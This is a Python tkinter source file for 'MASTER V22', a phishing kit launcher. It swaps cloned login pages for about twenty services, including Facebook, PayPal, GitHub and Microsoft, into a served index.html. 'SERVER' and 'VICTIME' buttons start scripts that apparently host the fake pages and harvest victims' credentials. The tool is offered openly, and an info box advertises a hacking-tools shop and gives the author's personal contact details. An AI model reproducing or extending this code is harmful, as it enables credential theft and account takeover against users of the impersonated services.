from tkinter import *
import time
import os
from tkinter import messagebox

root = Tk()
root.title("MASTER V22 ")
root.geometry("600x300")
root.config(bg="white")



Search_image=PhotoImage(file="IMG/logo.png")
myimage=Label(image=Search_image)
myimage.place(x=20,y=45)






def facebook():
    os.system('rm -rif index.html')
    os.system('cp login/facebook.html login/index.html')

def instagram():
    os.system('rm -rif index.html')
    os.system('cp login/instagram.html login/index.html')


def adobi():
    os.system('rm -rif index.html')
    os.system('cp login/adobi.html login/index.html')

def linkedin():
    os.system('rm -rif index.html')
    os.system('cp login/linkedin.html login/index.html')

def paypal():
    os.system('rm -rif index.html')
    os.system('cp login/paypal.html login/index.html')

def spotify():
    os.system('rm -rif index.html')
    os.system('cp login/spotify.html login/index.html')

def wordpress():
    os.system('rm -rif index.html')
    os.system('cp login/wordpress.html login/index.html')

def badoo():
    os.system('rm -rif index.html')
    os.system('cp login/badoo.html login/index.html')

def github():
    os.system('rm -rif index.html')
    os.system('cp login/github.html login/index.html')

def messenger():
    os.system('rm -rif index.html')
    os.system('cp login/messenger.html login/index.html')

def yaho():
    os.system('rm -rif index.html')
    os.system('cp login/yaho.html login/index.html')

def steam():
    os.system('rm -rif index.html')
    os.system('cp login/steam.html login/index.html')

def pinterst():
    os.system('rm -rif index.html')
    os.system('cp login/pinterst.html login/index.html')

def create():
    os.system('rm -rif index.html')
    os.system('cp login/create.html login/index.html')

def gitlab():
    os.system('rm -rif index.html')
    os.system('cp login/gitlab.html login/index.html')

def microsoft():
    os.system('rm -rif index.html')
    os.system('cp login/microsoft.html login/index.html')

def twitsh():
    os.system('rm -rif index.html')
    os.system('cp login/twitsh.html login/index.html')

def yandex():
    os.system('rm -rif index.html')
    os.system('cp login/yandex.html login/index.html')

def protonmail():
    os.system('rm -rif index.html')
    os.system('cp login/protonmail.html login/index.html')

def netflix():
    os.system('rm -rif index.html')
    os.system('cp login/netflix.html login/index.html')

def origin():
    os.system('rm -rif index.html')
    os.system('cp login/origin.html login/index.html')



def server():
   os.system('python3 server.py&')

def victime():
   os.system('python3 victime.py&')

def info():
    messagebox.showinfo("MASTER V22 ", "PERSONAL INFORMATION \n NAME:RYAN GRAICHI \n AGE : 19 ANS \n\n\n NAME PROGRAME: MASTER V22 \n DATE CREATED: 2022-05-06 \n ORIGINAL PROGRAME \n CONTACT ME \n\n\n WEBSITE https://hack-tools-shop.blogspot.com \n FB RHG OR RYANGRAICHI \n GMAIL rayanegraichi15@gmail.com \n\n Numiro: 0553827690 THANKS FOR DOWNLOADING THE PROGRAME")

path=Label(root,text="CODED BY RHG",bg="white",font="Arial 7 bold")
path.place(x=490,y=280)


path=Label(root,text="MASTER V22",bg="white",font="Arial 9 bold")
path.place(x=250,y=5)

path=Button(root,text="VICTIME",bg="#34A56F",font="Arial 7 bold" ,command = victime)
path.place(x=10,y=270)




path=Button(root,text="SERVER",bg="#34A56F",font="Arial 7 bold" ,command = server)
path.place(x=200,y=270)



path=Button(root,text="INFO",bg="#34A56F",font="Arial 7 bold" ,command = info)
path.place(x=350,y=270)




facebook = Button(root,bg="#fff",font="Arial 7 bold" ,text = "FACEBOOK",command = facebook)
facebook.place(x = 150,y = 50)


adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "EBAY ",command = adobi)
adobi.place(x = 220,y = 50)

linkedin = Button(root,bg="#fff",font="Arial 7 bold" ,text = "LINKEDIN",command = linkedin)
linkedin.place(x = 275,y = 50)

paypal = Button(root,bg="#fff",font="Arial 7 bold" ,text = "PAYPAL",command = paypal)
paypal.place(x = 345,y = 50)

spotify = Button(root,bg="#fff",font="Arial 7 bold" ,text = "SPOTIFY",command = spotify)
spotify.place(x = 400,y = 50)

wordpress = Button(root,bg="#fff",font="Arial 7 bold" ,text = "WORDPRESS",command = wordpress)
wordpress.place(x = 465,y = 50)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "BADOO   ",command = badoo)
adobi.place(x = 150,y = 85)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "GITHUB",command = github)
adobi.place(x = 220,y = 85)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "MESSENGER",command = messenger)
adobi.place(x = 275,y = 85)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "YAHO ",command = yaho)
adobi.place(x = 350,y = 85)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "STEAM  ",command = steam)
adobi.place(x = 400,y = 85)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = " PINTERST  ",command = pinterst)
adobi.place(x = 465,y = 85)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "GOOGLE  ",command = create)
adobi.place(x = 150,y = 120)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "GITLAB",command = gitlab)
adobi.place(x = 220,y = 120)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "MICROSOFT",command = microsoft)
adobi.place(x = 275,y = 120)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "TWITSH",command = twitsh)
adobi.place(x = 350,y = 120)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "YANDEX",command = yandex)
adobi.place(x = 405,y = 120)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "PROTONMAIL",command = protonmail)
adobi.place(x = 465,y = 120)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "NETFLIX",command = netflix)
adobi.place(x = 150,y = 155)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "SNAPCHAT",command = origin)
adobi.place(x = 215,y = 155)

adobi = Button(root,bg="#fff",font="Arial 7 bold" ,text = "INSTAGRAM",command = instagram)
adobi.place(x = 285,y = 155)
root.mainloop()
